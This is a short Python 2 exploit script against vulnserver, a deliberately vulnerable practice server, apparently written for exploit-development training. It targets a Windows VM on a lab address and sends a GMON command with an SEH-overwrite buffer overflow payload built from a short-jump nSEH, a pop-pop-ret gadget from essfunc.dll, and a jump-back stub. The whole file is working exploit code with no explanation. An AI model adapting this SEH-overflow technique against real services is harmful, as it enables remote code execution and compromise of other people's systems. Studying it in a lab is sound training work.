#!/usr/bin/python

import socket
import os
import sys

host = '192.168.100.118'        # Windows VM
port = 9999                     # vulnserver port

nSeh = '\xeb\x06\x90\x90' # short jump 6 bytes over seh to land in C buffer
Seh = '\xb4\x10\x50\x62'  # 0x625010b4 - pop ebx, pop ebp, ret -  essfunc.dll

# push esp
# pop eax
# add ax,998
# jmp eax
jumpback = '\x54\x58\x66\x05\xE6\x03\xFF\xE0'

buffer = 'A' * 3494
buffer += nSeh
buffer += Seh
buffer += jumpback
buffer += 'C' * (5012 - len(buffer))


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host,port))
print s.recv(1024)
s.send("GMON /.../" + buffer)
print s.recv(1024)
s.close()


